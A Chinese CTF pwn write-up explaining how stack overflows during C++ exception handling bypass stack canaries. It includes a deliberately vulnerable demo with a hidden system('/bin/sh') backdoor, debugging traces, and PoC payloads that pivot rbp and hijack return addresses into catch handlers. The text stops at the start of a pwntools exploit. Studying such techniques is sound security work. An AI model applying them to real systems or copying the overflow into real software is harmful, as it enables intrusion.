---
title: 分享C++ PWN 出题经历——深入研究异常处理机制
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458587285&idx=1&sn=abb65900617192862a2121a3a8dd1ca2&chksm=b18c201f86fba90983cb529b5603e90764f6831cee85668d125b1e2c1f0dfc6625cab5fed3fe&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-12-18
fetch_date: 2025-10-06T19:42:41.214593
---

# 分享C++ PWN 出题经历——深入研究异常处理机制

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EnK64s6ynCyx5WwduY9qSibZpSrbSoFBDSVcBGjQCyOKsibicwZNe25WZTQtFDNATKosg8hicazYiaicKA/0?wx_fmt=jpeg)

# 分享C++ PWN 出题经历——深入研究异常处理机制

ve1kcon

看雪学苑

```
一

原理探究
```

##

C++异常处理

本节内容针对 Linux 下的 C++ 异常处理机制，重点在于研究如何**在异常处理流程中利用溢出漏洞**，所以不对异常处理及`unwind`的过程做详细分析，只做简单介绍。

异常机制中主要的三个关键字：`throw`抛出异常，`try`包含异常模块,`catch`捕捉抛出的异常，它们一起构成了由**“抛出->捕捉->回退”**等步骤组成的整套异常处理机制。

当一个异常被抛出时，就会立即引发 C++ 的异常捕获机制。异常被抛出后如果在当前函数内没能被 catch，该异常就会沿着函数的调用链继续往上抛，在调用链上的每一个函数中尝试找到相应的 catch 并执行其代码块，直到走完整个调用链。如果最终还是没能找到相应的 catch，那么程序会调用`std::terminate()`，这个函数默认是把程序`abort`

其中，从程序抛出异常开始，沿着函数的调用链找相应的 catch 代码块的整个过程叫作栈回退`stack unwind`

**回到对 C++ 异常处理机制进行利用的话题，下面开始调试一个 demo 来加深对异常处理机制的理解，目的是去验证下列两个想法的可行性：**

1.通过篡改 rbp 可以实现类似栈迁移的效果，来控制程序执行流 ROP

2.`unwind`会检测在调用链上的函数里是否有`catch handler`，要有能捕捉对应类型异常的 catch 块；通过劫持 ret 可以执行到目标函数的 catch 代码块，但是前提是要需要拥有合法的 rbp

demo 的源码如下：

```
// exception.cpp
// g++ exception.cpp -o exc -no-pie -fPIC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor()
{
    try
    {
        printf("We have never called this backdoor!");
    }
    catch (const char *s)
    {
        printf("[!] Backdoor has catched the exception: %s\n", s);
        system("/bin/sh");
    }
}

class x
{
public:
    char buf[0x10];
    x(void)
    {
        // printf("x:x() called!\n");
    }
    ~x(void)
    {
        // printf("x:~x() called!\n");
    }
};

void input()
{
    x tmp;
    printf("[!] enter your input:");
    fflush(stdout);
    int count = 0x100;
    size_t len = read(0, tmp.buf, count);
    if (len > 0x10)
    {
        throw "Buffer overflow.";
    }
    printf("[+] input() return.\n");
}

int main()
{
    try
    {
        input();
        printf("--------------------------------------\n");
        throw 1;
    }
    catch (int x)
    {
        printf("[-] Int: %d\n", x);
    }
    catch (const char *s)
    {
        printf("[-] String: %s\n", s);
    }
    printf("[+] main() return.\n");
    return 0;
}
```

###

### 调试分析第一种利用方式

上述源码编译出来的可执行文件的保护如下，开了 canary 保护。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

输入点 buf 距离 rbp 的距离是 0x30

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KMxKxQRzsicS4mJiaH0FWdp3xU2EeDsa9IyicM9kGyZALZQOj1qexjpBvg/640?wx_fmt=png&from=appmsg)

所以测试输入长度分别为 0x31 和 0x39 的 PoC，发现会报不同的 crash，合理推测栈上的数据（例如 ret, rbp）会影响异常处理的流程。

```
ve1kcon@wsl:~$ cyclic 48
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
ve1kcon@wsl:~$ cyclic 56
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa
```

能发现无论怎么样都不会输出程序里写在`input()`函数里的`[+] input() return.`

这是因为异常处理时从`__cxa_throw()`开始，之后进行`unwind, cleanup, handler`, 程序**不会再执行发生异常所在函数的剩余部分**，会沿着函数调用链往回找**能处理对应异常的**最近的函数，然后**回退至此函数执行其 catch 块**后跟着往下运行，途径的函数的剩余部分也不会再执行，自然不会执行到出现异常的函数的 throw 后面的语句，更不会执行到这些函数的 ret。

> 这里就能抛出一个思考了：对 canary 的检测一般在最后的函数返回处，那么在执行异常处理流程时不就能跳过`stack_check_fail()`这个调用了嘛？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8Kp1X2m24ia8uyfkyWO8wPEJeOFgZ4QOVXubGficxL6bn2Dnr0pU5vu8gw/640?wx_fmt=png&from=appmsg)

下面利用`poc1 = padding + '\x01'`覆盖 rbp 值，可以将断点断在`call _read`指令后面一点的位置，这样就能断下来了，在这里观察到 rbp 的低一字节已被成功篡改为`'\x01'`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KiaS18EaBGSucJs4Am15UF2Qw2oT9ZamOdkZuHNojeVXzsg6P19zyOKw/640?wx_fmt=png&from=appmsg)

继续运行至程序报错的位置，最后在`0x401506`这条 ret 指令处出了问题，是错误的返回地址导致的，记录下这个指令地址，后续可以将断点打在这里，观察是否能成功控制程序流。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8K0Hq38zL5MqSohtsS6555Sxw2uItzBg5AqWsa8sbXZjCgWSIwCLSKZA/640?wx_fmt=png&from=appmsg)

根据这个指令的地址，可以在 IDA 中定位到这是异常处理结束后最终的 ret 指令，所以可以确定是在执行 main 的 handler 时 crash，那么上述报错出现的原因其实就很明显了，是因为最后执行的`leave; ret`使得 ret 的地址变成了`[rbp+8]`，导致不合法的返回地址。这也意味着在 handler 里就能够完成栈迁移，所以可以尝试通过篡改 rbp 实现控制程序执行提前布置好的 ROP 链。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KicxaPNODEO0tLexNicYliarkFTgibj0rvsfIFByHZicBAKmicRb4MQ5qPm7g/640?wx_fmt=png&from=appmsg)

接下来尝试劫持程序去执行 GOT 表里的函数：

```
.got.plt:0000000000404040 off_404040      dq offset fflush        ; DATA XREF: _fflush+4↑r
.got.plt:0000000000404048 off_404048      dq offset read          ; DATA XREF: _read+4↑r
.got.plt:0000000000404050 off_404050      dq offset puts          ; DATA XREF: _puts+4↑r
.got.plt:0000000000404058 off_404058      dq offset __cxa_end_catch
```

利用`poc2 = padding + p64(0x404050-0x8)`，运行到上述断点处发现成功调用到了`puts`函数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KTeibzGwOEXRqvS8bHrQdrW4RCYNia6ial0wXM0UEuHvmxMkA6ZD4m6aZA/640?wx_fmt=png&from=appmsg)

证明第一种利用方式可行

### 关于第一种利用方式的后续思考

但这种利用方式只适用于 “通过将`old_rbp`存储于栈中来保留现场” 的函数调用约定，以及需要出现异常的函数的`caller function`要存在处理对应异常的代码块，否则也会走到`terminate。`

为了调试上述说法，对 demo 作了修改，主要改动如下：

```
void test()
{
 x tmp;
 printf("[!] enter your input:");
 fflush(stdout);
 int count = 0x100;
 size_t len = read(0, tmp.buf, count);
 if (len > 0x10)
 {
     throw "Buffer overflow.";
 }
 printf("[+] test() return.\n");
}

void input()
{
 test();
 printf("[+] input() return.\n");
}
```

这回同样是使用`poc2`，但 crash 了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KdMJhatOT7t6JAteZPPZwt9jPlUmDVCtu8TUFAfr0s6UJ4DSYb88xicQ/640?wx_fmt=png&from=appmsg)

对 demo 重新修改的部分如下：

```
void input()
{
 try
 {
     test();
 }
 catch (const char *s)
 {
     printf("[-] String(From input): %s\n", s);
 }
 printf("[+] input() return.\n");
}
```

复现成功，这次是在 input 的 handler 里被劫持，而非在 main 了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KVaMf7iahwtGDJtcbiaLaT4eQeV14mbv0Uzow75mTRdx81xcAHOSrN6lw/640?wx_fmt=png&from=appmsg)

但是噢，如果是通过打返回地址劫持到另外一个函数的异常处理模块，是没有 “出现异常的函数的 caller function 要存在处理对应异常的代码块” 这层限制的，但这也是后话了。

### 调试分析第二种利用方式

由于调用链`__cxa_throw`->`_Unwind_RaiseException`，在 unwind 函数里会取运行时栈上的返回地址 callee ret 来对整个调用链进行检查，它会在链上的函数里搜索`catch handler`，若所有函数中都无对应类型的 catch 块，就会调用`__teminate()`终止进程。

利用`poc3 = poc2 + 'b'*8`调试一下后面的 unwind 函数的过程，一直运行至`_Unwind_RaiseException+463`发生了 crash，合理猜测是在这调用的函数里作的检测，所有可以观察下此时传参的情况，下断方式是`b *(&_Unwind_RaiseException+463)`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KOtrPDRIbibYKTPcptnf3icKgKjFByYicHoN1tIHBaUEy5tQyDtPHuRkaw/640?wx_fmt=png&from=appmsg)

这个地方循环执行了几次

第一次，`rdx -> 0x4000000000000000`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KvWksDFeyyDloHmNTYIdonEMe7K4EAm7Cct5mgmoLnIeSIkyIoOqetw/640?wx_fmt=png&from=appmsg)

第二次，`rdx -> 0x4013a7 (input()+162)`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KibUAo3hbKfquwLWsdMMCKmHLfw9oPrKgAaLSb5bTPpS9GdRzE6LNgVw/640?wx_fmt=png&from=appmsg)

第三次，`rdx -> 0x6262626262626262 ('bbbbbbbb')`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KMjsy75LZic38K1LkHU1a4Gl6ib5bebITRD58yicT4vZymxaicCrxm4bv8g/640?wx_fmt=png&from=appmsg)

再琢磨下异常处理机制，就能够发现另外一个利用点，就是假如函数A内有能够处理对应异常的 catch 块，是否可以通过影响运行时栈的函数调用链，即更改某 callee function ret 地址，从而能够成功执行到函数A的 handler 呢。

下面尝试通过直接劫持`input()`函数的 ret, 可以发现在源码中有定义`backdoor()`函数，但程序中并**没有一处存在对该后门函数的引用**，利用`poc4 = poc2 + p64(0x401292+1)`尝试触发后门。

> 这里将返回地址填充成了`backdoor()`函数里**try 代码块**里的地址，它是一个范围，经测试能够成功利用的是一个**左开**右不确定的区间（x）

```
.text:0000000000401283                 lea     rax, format     ; "We have never called this backdoor!"
.text:000000000040128A                 mov     rdi, rax        ; format
.text:000000000040128D                 mov     eax, 0
.text:0000000000401292 ;   try {
.text:0000000000401292                 call    _printf
.text:0000000000401292 ;   } // starts at 401292
.text:0000000000401297                 jmp     short loc_4012FF
```

可以看见程序执行了后门函数的异常处理模块，复现成功，成功执行到了一个从未引用过的函数，而且程序从始至终都是开了 canary 保护的，这直接造成的栈溢出却能绕过`stack_check_fail()`这个函数对栈进行检测。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FLwf0ibWjyRXdhX5Ph4UU8KMibxMMNeomXYLvLLUw7tLo1qzNu5Ir2iaicD8Jia7g70V6sdoKibREl6SHA/640?wx_fmt=png&from=appmsg)

exp 如下：

```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "split...